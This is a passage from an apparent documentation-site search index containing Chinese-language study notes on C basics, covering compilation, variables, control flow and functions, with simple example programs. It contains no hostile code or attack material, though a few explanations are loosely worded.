\u9884\u5904\u7406\u5668(\u5728\u5b9e\u9645\u7f16\u8bd1\u4e4b\u524d)\uff0c\u5b83\u4f1a\u5904\u7406\u8fd9\u4e9b\u6307\u4ee4\u5e76\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u4ee3\u7801\u3002\u5728\u8fd9\u4e2a\u9884\u5904\u7406\u6b65\u9aa4\u4e4b\u540e\uff0c\u4fee\u6539\u540e\u7684\u4ee3\u7801\u5c06\u7531\u7f16\u8bd1\u5668\u8fdb\u884c\u7f16\u8bd1\u3002</p>"},{"location":"cs/c/2.1/#compiler","title":"Compiler","text":"<ol> <li>\u7f16\u8bd1\uff08Compiler\uff09\uff1a</li> </ol> <p>\u6e90\u4ee3\u7801\uff08Source Code\uff09\u6587\u4ef6\uff08\u901a\u5e38\u4e3a.c\u6587\u4ef6\uff09\u7531\u7f16\u8bd1\u5668\u5904\u7406\u3002\u7f16\u8bd1\u5668\u9996\u5148\u5bf9\u4ee3\u7801\u8fdb\u884c\u9884\u5904\u7406\uff0c\u5904\u7406\u5982 <code>#include</code> \u548c <code>#define</code> \u7b49\u6307\u4ee4\u3002\u7136\u540e\uff0c\u5b83\u4f1a\u8fdb\u884c\u5b9e\u9645\u7684\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u8fd9\u5305\u62ec\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u751f\u6210\u4e2d\u95f4\u4ee3\u7801\u3001\u4f18\u5316\u4ee5\u53ca\u6700\u7ec8\u751f\u6210\u673a\u5668\u4ee3\u7801\u3002\u7f16\u8bd1\u540e\u751f\u6210\u7684\u662f\u76ee\u6807\u6587\u4ef6\uff08Object File\uff09\uff0c\u901a\u5e38\u8fd9\u662f\u4e00\u79cd\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5305\u542b\u4e86\u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1\u8fc7\u6765\u7684\u673a\u5668\u6307\u4ee4\uff0c\u4f46\u8fd9\u4e9b\u6307\u4ee4\u5c1a\u672a\u94fe\u63a5\u6210\u53ef\u6267\u884c\u7a0b\u5e8f\u3002</p> <ol> <li>\u94fe\u63a5\uff08Linker\uff09\uff1a</li> </ol> <p>\u94fe\u63a5\u5668\u8d1f\u8d23\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u76ee\u6807\u6587\u4ef6\u4e0e\u5e93\u6587\u4ef6\uff08Library Files\uff09\u7ed3\u5408\u8d77\u6765\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u89e3\u51b3\u4e86\u7a0b\u5e8f\u4e2d\u5bf9\u5e93\u51fd\u6570\u4ee5\u53ca\u7a0b\u5e8f\u4e2d\u5176\u4ed6\u6587\u4ef6\u7684\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5f15\u7528\u95ee\u9898\u3002\u5982\u679c\u4f60\u7684\u7a0b\u5e8f\u8c03\u7528\u4e86\u4efb\u4f55\u5e93\u51fd\u6570\uff08\u6bd4\u5982\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\u51fd\u6570\uff09\uff0c\u94fe\u63a5\u5668\u4f1a\u67e5\u627e\u8fd9\u4e9b\u51fd\u6570\u5728\u5e93\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684\u4ee3\u7801\u94fe\u63a5\u5230\u4f60\u7684\u7a0b\u5e8f\u4e2d\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u5b8c\u6574\u6027\u3002</p> <ol> <li>\u5e93\u6587\u4ef6\uff08Library Files\uff09\uff1a</li> </ol> <p>\u5e93\u6587\u4ef6\u5305\u542b\u9884\u5b9a\u4e49\u7684\u51fd\u6570\u548c\u8d44\u6e90\uff0c\u8fd9\u4e9b\u53ef\u4ee5\u88ab\u591a\u4e2a\u7a0b\u5e8f\u5171\u540c\u4f7f\u7528\u3002\u4e0d\u9700\u8981\u91cd\u590d\u7f16\u5199\u5e38\u7528\u7684\u4ee3\u7801\uff0c\u53ea\u9700\u5728\u9700\u8981\u65f6\u94fe\u63a5\u76f8\u5e94\u7684\u5e93\u3002</p> <p></p>"},{"location":"cs/c/2.1/#variables","title":"Variables","text":""},{"location":"cs/c/2.1/#ram","title":"RAM","text":"<ul> <li>single integer value - 4 bytes</li> <li>single floating value - 8 bytes</li> </ul>"},{"location":"cs/c/2.1/#name","title":"NAME","text":"<p>\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u540e\u63a5 _A-Za-z0-9</p> <p>C \u8bed\u8a00\u533a\u522b\u5927\u5c0f\u5199\uff0cC \u9884\u5904\u7406\u5668\u63d0\u4f9b\u7684\u5e38\u91cf\u4f7f\u7528\u5927\u5199\u8868\u793a\uff1a<code>MAXLENGTH, AVATAR, BUFSIZ, ROT</code></p> <p>\u8f83\u65e7\u7684 C \u7f16\u8bd1\u5668\u5c06\u53d8\u91cf\u540d\u79f0\u9650\u5236\u4e3a 8 \u4e2a\u552f\u4e00\u5b57\u7b26, \u5982\u679c\u4e3a\u65e7\u73af\u5883\u5f00\u53d1\u53ef\u79fb\u690d\u4ee3\u7801\uff0c\u8bf7\u8bb0\u4f4f\u8fd9\u4e00\u70b9</p>"},{"location":"cs/c/2.1/#data-type","title":"Data Type","text":"<p>bool, char, int, float \u4ee5\u53ca double \u4e3a\u4e3b\u8981\u57fa\u7840\u6570\u636e\u7c7b\u578b</p> <p>\u5386\u53f2\u4e0a\uff0c\u4e0d\u540c\u8ba1\u7b97\u673a\u5236\u9020\u5546\u5728\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u5185\u5b58\u5927\u5c0f\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u5bfc\u81f4\u4e0d\u517c\u5bb9\u6027\u95ee\u9898\u3002</p> <p>C \u8bed\u8a00\u901a\u8fc7\u4e0d\u6307\u5b9a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u6765\u89e3\u51b3\u6b64\u95ee\u9898\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6e90\u4ee3\u7801\u7ea7\u522b\u5177\u6709\u53ef\u79fb\u690d\u6027\u3002</p> <p>C \u8bed\u8a00\u552f\u4e00\u8981\u6c42\u662f\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u7684\u5927\u5c0f\u5173\u7cfb\u5e94\u4e3a\uff1asizeof(char) \u2264 sizeof(short) \u2264 sizeof(int) \u2264 sizeof(long)\u3002</p> <p>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e0d\u540c C \u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u5927\u5c0f\u7684\u6574\u6570\uff0c\u5bfc\u81f4\u5b58\u50a8\u5927\u5c0f\u7684\u53d8\u5316\u3002</p> <p>\u6d4b\u8bd5\u5f53\u524d\u67b6\u6784\u4e0b\u6570\u636e\u7c7b\u578b\u5185\u5b58\u5927\u5c0f\u4ee3\u7801\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    printf(\"char  %lu\\n\", sizeof(char));\n    printf(\"short %lu\\n\", sizeof(short));\n    printf(\"int   %lu\\n\", sizeof(int));\n    printf(\"long  %lu\\n\", sizeof(long));\n    return 0;\n}\n</code></pre> <p>Macbook Air M2 \u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>char  1\nshort 2\nint   4\nlong  8\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u8fd9\u53f0\u67b6\u6784\u7684\u8ba1\u7b97\u673a can only represent the values -2,147,483,648 to 2,147,483,647</p> <p>\u8fd9\u4e2a\u503c\u7684\u8ba1\u7b97\u516c\u5f0f\u4e3a 4 bytes = 4 * 8 bits = 32, 2^32 = 4294967296</p> <p>\u800c\u4e3a\u4e86\u8868\u8fbe\u6b63\u8d1f\u6570\uff0c\u9700\u8981\u5206\u914d\u4e00\u534a\u7ed9\u6b63\u6570\u4e00\u534a\u7ed9\u8d1f\u6570\uff0c\u6b63\u6570\u7684\u8303\u56f4\u662f 0 \u5230 2,147,483,647\uff0c\u8d1f\u6570\u7684\u8303\u56f4\u662f -1 \u5230 -2,147,483,648\u3002</p>"},{"location":"cs/c/2.1/#the-scope-of-variables","title":"The scope of variables","text":"<p>C \u53ea\u6709 2 \u79cd\u4e3b\u8981\u7c7b\u578b\u7684\u8303\u56f4\uff1a</p> <ul> <li>global scope</li> </ul> <p>\u5168\u5c40\u4f5c\u7528\u57df\uff08\u6709\u65f6\u79f0\u4e3a\u6587\u4ef6\u4f5c\u7528\u57df\uff09\uff0c\u5176\u4e2d\u53d8\u91cf\u5728\u6240\u6709\u51fd\u6570\u548c\u8bed\u53e5\u5757\u4e4b\u5916\u58f0\u660e\uff0c\u4ee5\u53ca</p> <ul> <li>block scope in which variables are declared within a function or statement block.</li> </ul> <p>\u5728\u51fd\u6570\u6216\u8bed\u53e5\u5757\u4e2d\u58f0\u660e\u53d8\u91cf\u7684\u5757\u4f5c\u7528\u57df</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nstatic int count = 0;\n\nint main(int argcount, char *argvalue[])\n{\n    int nfound = 0;\n\n    // check the number of arguments\n    if(argcount != 2) {\n        int nerrors = 1;\n\n        ....\n        exit(EXIT_FAILURE);\n    }\n    else {\n        int ntimes = 100;\n\n        ....\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u5176\u4e2d count \u4e3a global scope, static \u9632\u6b62\u5916\u90e8\u6587\u4ef6\u8bbf\u95ee\uff0cnfound\uff0cnerrors, ntimes \u5177\u6709 block scope </p> <p>C \u8bed\u8a00\u63a7\u5236\u6d41\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c</p>"},{"location":"cs/c/2.1/#conditional-execution","title":"Conditional execution","text":"<pre><code>if(condition1) {                \n  // more statements;\n  .....\n}\nelse if(condition2) {\n  // more statements;\n  .....\n}\nelse {\n  // more statements;\n  .....\n}\n</code></pre> <p>curly-brackets \u975e\u5fc5\u9700\u4f46\u662f\u548c Java \u4e00\u6837\u4e3a\u4e00\u79cd\u4e66\u5199\u683c\u5f0f\u6807\u51c6</p>"},{"location":"cs/c/2.1/#boolean-values","title":"Boolean values","text":"<p>\u5728 ISO-C99 \u4e4b\u524d\uff0cC \u6807\u51c6\u6ca1\u6709\u5e03\u5c14\u6570\u636e\u7c7b\u578b, 0 \u4ee3\u8868 false 1 \u4ee3\u8868 true</p> <pre><code>int initialised = 0\n\nif (0 == initialised) {\n  // initialisation statements;\n  .....\n  initialised = 1; // set to true\n}\n</code></pre> <p>\u800c\u540e\u9700\u8981\u4f7f\u7528 true \u548c false constants \u7684\u65f6\u5019\u9700\u8981\u5012\u5165 <code>#include &lt;stdbool.h&gt;</code> \u5e93</p>"},{"location":"cs/c/2.1/#switch-statements","title":"switch statements","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int value = 2;\n\n    // \u4f7f\u7528 if..else if..else \u7ed3\u6784\n    if(value == 1) {\n        printf(\"The value is 1.\\n\");\n    } \n    else if(value == 2) {\n        printf(\"The value is 2.\\n\");\n    } \n    else {\n        printf(\"The value is neither 1 nor 2.\\n\");\n    }\n\n    // \u4f7f\u7528 switch \u7ed3\u6784\n    switch(value) {          \n        case 1 :\n            printf(\"The value is 1.\\n\");\n            break;\n\n        case 2 :\n            printf(\"The value is 2.\\n\");\n            break;\n\n        default :\n            printf(\"The value is neither 1 nor 2.\\n\");\n            break;\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>\u6bcf\u4e2a case \u540e\u90fd\u5fc5\u987b\u52a0\u4e0a break \u79bb\u5f00 switch control flow\uff0c\u5982\u679c\u5fd8\u8bb0\u6dfb\u52a0 break \u8bed\u53e5\u5c31\u4f1a\u81ea\u52a8\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u4e2a case \u5206\u652f</li> <li>if \u548c switch \u4e2d\u7684 expression \u6570\u636e\u7c7b\u578b\u5fc5\u987b\u662f\u6574\u6570\u3001\u5b57\u7b26\u3001\u5e03\u5c14\u503c\u4e0e enumerated types\uff0c\u4f46\u662f\u4e0d\u80fd\u662f real \u6216 floating</li> <li>\u5982\u679c\u6bd4\u8f83\u503c\u8f83\u591a\u7684\u60c5\u51b5\u4e0b switch \u4e3a\u4f18\u5316\u4ee3\u7801\u91cf\u7b80\u6d01\u7684\u597d\u65b9\u6848\uff0c\u56e0\u4e3a case \u5185\u4e0d\u7528\u50cf if \u4e00\u6837\u6dfb\u52a0 curly brackets</li> </ul> <p>value \u8981\u5bf9\u6bd4\u7684\u53d8\u91cf\uff0cdefault \u53ef\u5f53\u4f5c if \u8bed\u53e5\u4e2d\u7684 else</p>"},{"location":"cs/c/2.1/#for-bounded-loops","title":"for - bounded loops","text":"<p>\u6709\u754c\u5faa\u73af\u548c Java \u4e00\u6837\u8bed\u6cd5\uff1a</p> <pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n// the above introduced a loop-control variable, i\n  .....\n  printf(\"loop number %i\\n\", i);\n  .....\n// variable i is available down to here\n}\n\nfor(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n  .....\n  printf(\"loop using character '%c'\\n\", ch);\n  .....\n}\n</code></pre> <p>\u4e09\u4e2a\u53c2\u6570\u4e3a\u8d77\u59cb\u503c\u3001\u505c\u6b62\u6761\u4ef6\uff0c\u6267\u884c\u8fc7\u7a0b\u7b97\u6cd5\uff1b\u53d8\u91cf\u5728 for loop \u5185\u90e8\u4f7f\u7528\u5b8c\u540e\u6d88\u5931</p>"},{"location":"cs/c/2.1/#while-do-while-unbounded-loops","title":"while &amp; do while - unbounded loops","text":"<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    while (i &lt;= NLOOPS)\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    }\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u4e0e Python \u4e00\u6837 while \u7684 expression \u610f\u601d\u4e3a\u53ea\u8981 i &lt;= 20 \u90a3\u5c31\u4fdd\u6301 true \u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u8fb9\u754c\u90a3\u5c31 false \u9000\u51fa\u5faa\u73af</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    do\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    } while (i &lt;= NLOOPS);\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u5f00\u5934 while \u6362\u6210 do \u540e curly bracket \u4e4b\u540e\u52a0\u4e0a while expression \u4e3a do while \u5faa\u73af\uff1b\u4e0e for \u4e0d\u540c\u7684\u662f while \u9700\u4ece\u5916\u90e8\u58f0\u660e\u5f15\u5165\u53d8\u91cf\u7528\u4e8e\u8fed\u4ee3</p>"},{"location":"cs/c/2.1/#nest-loop","title":"Nest loop","text":"<pre><code>#define NROWS 6\n#define NCOLS 4\n\nfor(int row = 1 ; row &lt;= NROWS ; row = row+1) {      // the 'outer' loop\n\n    for(int col = 1 ; col &lt;= NCOLS ; col = col+1) {  // the 'inner' loop\n        printf(\"(%i,%i)  \", row, col);               // print row and col as if \"coordinates\"  \n    }\n    printf(\"\\n\");                                    // finish printing on this line\n}\n</code></pre>"},{"location":"cs/c/2.1/#define-variables","title":"define &amp; variables","text":"<p>define \u4e3a\u5728\u6267\u884c\u671f\u95f4\u505a\u6587\u672c\u66ff\u6362\uff0c\u5f53\u9700\u8981\u6539\u53d8\u884c\u6570\u6216\u5217\u6570\u65f6\uff0c\u53ea\u9700\u4fee\u6539\u5b9a\u4e49\u7684\u5730\u65b9\uff0c\u800c\u4e0d\u5fc5\u5728\u6574\u4e2a\u4ee3\u7801\u4e2d\u5bfb\u627e\u548c\u4fee\u6539\u76f8\u5e94\u7684\u53d8\u91cf\u5b9a\u4e49\uff1b\u5e76\u4e14\u901a\u5e38\u9759\u6001\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u4f1a\u4e00\u76f4\u5b58\u5728\u5185\u5b58\u4e2d</p>"},{"location":"cs/c/2.1/#break-continue","title":"break &amp; continue","text":"<pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n    // Read an input character from the keyboard\n    .....\n    if(input_char == 'Q') { // Should we quit?\n        break;\n    }\n    .....\n    .....\n}\n// Come here after the 'break'.  i is unavailable\n</code></pre> <p>\u5728\u7528\u6237\u8f93\u5165 Q \u540e\u6574\u4e2a\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa</p> <pre><code>for(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n    if(ch == 'm') { // skip over the character 'm'\n        continue;\n    }\n    .....\n    .....\n    statements that will never see ch == 'm'\n    .....\n    .....\n}\n</code></pre> <p>\u5faa\u73af\u4e2d\u78b0\u5230 m \u540e\u4e0d\u505a\u4efb\u4f55\u64cd\u4f5c\u8df3\u8fc7\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5faa\u73af</p>"},{"location":"cs/c/2.1/#infinite-loops","title":"infinite loops","text":"<pre><code>for( ; ; ) {\n    .....\n    .....\n}\n</code></pre> <pre><code>#include &lt;stdbool.h&gt;\n\n// clearer - use this mechanism\nwhile( true ) {\n    .....\n    .....\n}\n</code></pre>"},{"location":"cs/c/2.1/#conclusion","title":"Conclusion","text":"<ul> <li>\u76f8\u6bd4\u4e8e Python, C \u8bed\u8a00\u548c Java \u4e00\u6837\u4e0d\u5728\u4e4e indent</li> <li>C \u63d0\u4f9b\u4e24\u79cd\u6d6e\u70b9\u6570\u636e\u7c7b\u578b float \u548c double \u5206\u522b\u5360\u7528 32 \u4e0e 64 \u5b57\u8282</li> </ul> <p>\u4f46\u5728 system programming \u4e2d\u4e3a\u4e86\u907f\u514d\u7cbe\u5ea6\u9ebb\u70e6\u66f4\u591a\u53ea\u7528\u6574\u6570\u7c7b\u578b\uff1a int, short, long, long long</p>"},{"location":"cs/c/2.2/","title":"2.2 Functions","text":""},{"location":"cs/c/2.2/#wed-lecture","title":"Wed Lecture","text":"<ol> <li>\u51fd\u6570\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u53ef\u8bfb\u6027\uff0c\u53ef\u79fb\u690d\u6027\uff0c\u53ef\u7ef4\u62a4\u6027\u7b49\uff0c\u4e5f\u53ef\u5728\u8f6f\u4ef6\u5de5\u7a0b\u91cd\u6784\u8fc7\u7a0b\u4e2d\u7528\u4e8e\u51cf\u5c11\u91cd\u590d\u4ee3\u7801\u91cf\u4e0e\u5185\u5b58\uff0c\u63d0\u4f9b\u5176\u4ed6\u6a21\u5757\u91cd\u590d\u8c03\u7528\uff0c\u540c\u65f6\u5c06\u8bed\u53e5\u62bd\u8c61\u5316</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u91c7\u7528\u4ee5\u4e0b\u51fd\u6570\u5b9a\u4e49\u660e\u786e\u7684\u5165\u53e3\u70b9\uff0c\u4ece\u7528\u6237\u7f16\u5199\u7684\u4ee3\u7801\u5230\u5185\u6838\u4e2d\uff0c\u6b64\u7c7b\u51fd\u6570\u79f0\u4e3a\u7cfb\u7edf\u8c03\u7528\u3002 \u5728 main \u51fd\u6570\u4e2d <code>return 0;</code> \u5c31\u662f\u5728\u544a\u8bc9\u7cfb\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\uff0c\u548c\u65e9\u671f\u7684\u65f6\u949f\u673a\u5236\u6709\u5173</li> <li>\u5e93\u5c01\u88c5\u518d\u5206\u53d1\uff0c\u8fd9\u91cc\u6559\u6388\u63d0\u5230 Apple \u7684\u6807\u51c6\u5e93\u4e2d\u9ed8\u8ba4\u9690\u5f0f\u5f97\u5e2e\u4f60\u8c03\u7528\u4e86\u90e8\u5206 math \u5e93\u6240\u4ee5\u4f60\u4e0d\u7528 include, \u4f46\u662f\u5728 linux \u9700\u8981\u786e\u4fdd\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6b63\u786e\u94fe\u63a5</li> <li>\u5728\u8db3\u591f\u5148\u8fdb\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u591a\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ef\u4ee5\u5171\u4eab\u4e00\u4e2a\u51fd\u6570\u7684\u5355\u4e2a\u5b9e\u4f8b\uff0c \u6bd4\u5982 printf\uff08\uff09 - \u524d\u63d0\u662f\u51fd\u6570\u7684\u4ee3\u7801\u4e0d\u80fd\u88ab\u4efb\u4f55\u8fdb\u7a0b\u4fee\u6539\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u5f15\u7528\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u4e0d\u540c data \u548c\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u53c2\u6570\u3002</li> <li>main \u51fd\u6570\u5728\u6b63\u5f0f\u7f16\u5199\u65f6\u53ea\u505a\u53c2\u6570\u5f02\u5e38\u5904\u7406</li> </ol> <p>main() should be constrained to:</p> <ul> <li>receive and check the program's command-line arguments,</li> <li>report errors detected with command-line arguments, and then call exit(EXIT_FAILURE)</li> <li>call functions from main(), typically passing information requested and provided by the command-line arguments, and finally call exit(EXIT_SUCCESS) if all went well.</li> <li>All error messages printed to the stderr stream.</li> <li>All 'normal' output printed to the stdout stream</li> </ul> Application domain (a sample of) 3rd-party libraries operating system services (files, directories, processes, inter-process communication) OS-specific libraries, e.g. glibc, System32, Cocoa web-based programming libcgi, libxml, libcurl data structures and algorithms the generic data structures library (GDSL) GUI and graphics development OpenGL, GTK, Qt, wxWidgets, UIKit, Win32, Tcl/Tk image processing (GIFs, JPGs, etc) GD, libjpeg, libpng networking Berkeley sockets, AT&amp;T's TLI security, cryptography openssl, libmp scientific computing NAG, Blas3, GNU scientific library (gsl) concurrency, parallel and GPU programming OpenMP, CUDA, OpenCL, openLinda (thread support is defined in C11, but not in C99) <p>\u867d\u7136 C \u8bed\u8a00\u672c\u8eab\u6ca1\u6709\u592a\u591a\u5b9e\u73b0\u7684\u5185\u7f6e\u65b9\u6cd5\uff0c\u4f46\u4ecd\u7136\u6709\u5927\u91cf\u7684\u5171\u4eab\u5e93</p>"},{"location":"cs/c/2.2/#the-datatype-of-a-function","title":"The datatype of a function","text":""},{"location":"cs/c/2.2/#void","title":"void","text":"<p>\u4e0d\u4f5c return \u53ea\u505a printf </p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid output(char ch, int n)        \n{\n    for(int i=1 ; i&lt;=n ; i=i+1) {\n        printf(\"%c\", ch);\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    output(' ', 19);\n    output('*',  1);\n    output('\\n', 1);\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/2.2/#extern","title":"extern","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nextern double sqrt(double x);\n\nfloat square(float x)\n{\n    return x * x;\n}\n\nint main(int argc, char *argv[])\n{\n    if(argc &gt; 2) {\n      float a, b, sum;\n\n      a   = atof(argv[1]);\n      b   = atof(argv[2]);\n\n      sum = square(a) + square(b);\n      printf(\"hypotenuse = %f\\n\",\n             sqrt(sum) );\n    }\n    return 0;\n}\n</code></pre> <p>header file \u91cc\u5e76\u4e0d\u4f1a\u5305\u542b\u4ee3\u7801\u5b9e\u73b0\uff0c\u53ea\u4f1a declare \u6709\u8fd9\u4e2a sqrt \u65b9\u6cd5\u5b58\u5728\u8fd9\u53eb declaration\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u53bb\u7528 extern \u91cd\u65b0\u4e66\u5199\u5176 definition \u907f\u514d\u5176\u9ed8\u8ba4\u4f7f\u7528 int \u5bf9\u5f85 args. double \u7684\u539f\u56e0\u4e3a\u5728 Linux \u4e2d\u5b9e\u9645\u4e0a\u6211\u4eec\u5e76\u4e0d\u4f1a\u4f7f\u7528\u592a\u591a float, \u7cbe\u5ea6\u4e0d\u591f\u65f6\u7cfb\u7edf\u4e00\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e0b\u4e00\u7ea7\u7684\u4e0a\u5347</p>"},{"location":"cs/c/2.2/#common-mistakes","title":"Common mistakes","text":"<ol> <li> <p>\u51fd\u6570\u4e0d\u9700\u8981\u5b9a\u4e49\u53c2\u6570\u4e5f\u53ef\u4ee5\u8fd0\u884c</p> <pre><code>void backup_files( void )            \n{\n    .....\n}\n</code></pre> </li> <li> <p>\u5728\u7f16\u5199 C \u8bed\u8a00\u4ee3\u7801\u65f6\uff0c\u4e0d\u8981\u4f9d\u8d56\u7279\u5b9a\u7684\u53c2\u6570\u6c42\u503c\u987a\u5e8f\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u4f18\u5316\u4ee5\u53ca\u4e0d\u540c\u67b6\u6784\u4e0b\u7684\u4f18\u5316\u7b56\u7565\uff0c\u4e0d\u540c\u67b6\u6784\u4e0b\u8fd0\u884c\u7684\u76f8\u540c\u4ee3\u7801\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53c2\u6570\u6c42\u503c\u987a\u5e8f\u4e0d\u540c</p> <pre><code>int square( int a )\n{\n    printf(\"calculating the square of %i\\n\", a);\n    return a * a;\n}\n\nvoid sum( int x, int y )\n{\n    printf(\"sum = %i\\n\", x + y );\n}\n\n....\n\n    ....\n    sum( square(3), square(4) );\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6bb5\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u673a\u5668\u4e0b\u6267\u884c\u51fa\u6765\u7684\u7ed3\u679c\u4e0d\u540c\uff1a</p> <pre><code>    calculating the square of 3     // the output on PowerPC Macs\n    calculating the square of 4\n    sum = 25\n\nor\n\n    calculating the square of 4     // the output on Intel Macs\n    calculating the square of 3\n    sum = 25\n</code></pre> </li> </ol>"},{"location":"cs/c/2.2/#static","title":"static","text":"<p>\u5bf9\u4e8e function \u6765\u8bf4\u7c7b\u4f3c\u4e8e Java \u7684 private \u7981\u6b62\u5916\u90e8\u8bbf\u95ee\uff0c\u79c1\u6709\u5316</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//  myfunction IS ONLY VISIBLE WITHIN THIS FILE, AND IS CALLED BY main\nstatic void myfunction(void)\n{\n    static int count = 1;    //  retains its value between function calls\n    int        local = 0;    //  is re-initialised on each function call\n\n    printf(\"count=%i  local=%i\\n\", count, local);\n    ++count;\n    ++local;\n}\n\n//  main IS NOT DECLARED AS static BECAUSE THE OPERATING SYSTEM MUST BE ABLE TO CALL IT\nint main(int argc, char *argv[])\n{\n    for(int i=0 ; i &lt; 5 ; ++i) {\n        myfunction();\n    }\n    exit(EXIT_SUCCESS);\n}\n</code></pre> <p>\u8fd9\u91cc\u7684 count \u4f5c\u4e3a\u9759\u6001\u5173\u952e\u5b57\uff0c\u6574\u4e2a\u751f\u547d\u5468\u671f\u53ea\u4f1a\u88ab\u5206\u914d\u4e00\u6b21\u5185\u5b58\uff0c\u65e0\u8bba\u51fd\u6570\u8c03\u7528\u591a\u5c11\u6b21\u8be5\u53d8\u91cf\u4e5f\u4e0d\u4f1a\u521d\u59cb\u5316\uff0c\u800c local \u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u91cd\u65b0\u88ab\u521d\u59cb\u5316\u6210 0 \u4f5c\u7528\u57df\u4e3a\u51fd\u6570\u5185\u90e8</p> <pre><code>count=1  local=0\ncount=2  local=0\ncount=3  local=0\ncount=4  local=0\ncount=5  local=0\n</code></pre>"},{"location":"cs/c/2.2/#functions-receiving-a-variable-number-of-arguments","title":"Functions receiving a variable number of arguments","text":"<p>\u8fd9\u91cc\u7b80\u8981\u4ecb\u7ecd\u4e86 <code>printf</code> \u8fd9\u6837\u7684\u53c2\u6570\uff0c\u591a\u4e2a\u53ef\u53d8\u53d8\u91cf\u80fd\u591f\u7ed1\u5b9a string \u4e2d\uff0c\u5c31\u5fc5\u987b\u63d0\u4f9b <code>%d %s %i</code> \u8fd9\u79cd\u53c2\u6570</p> <p>\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u7ed9\u7cfb\u7edf\u505a\u65e5\u5fd7\u8bb0\u5f55\u7684\u65f6\u5019\u751a\u81f3\u4e0d\u77e5\u9053\u53c2\u6570\u6570\u636e\u7c7b\u578b\u7684\u65f6\u5019\u5c31\u9700\u8981\u8c03\u7528\u7b2c\u4e09\u65b9\u5e93\u6bd4\u5982 <code>stdarg.h</code> \u53bb\u652f\u6301</p>"},{"location":"cs/c/2.2/#readings","title":"Readings","text":"<pre><code>#include &lt;stdio.h&gt;\n\n// This function takes no arguments and returns no value:\n\nvoid hello(void)\n{\n    printf(\"Hello, world!\\n\");\n}\n\nint main(void)\n{\n    hello();  // Prints \"Hello, world!\"\n}\n</code></pre> <p>function prototype 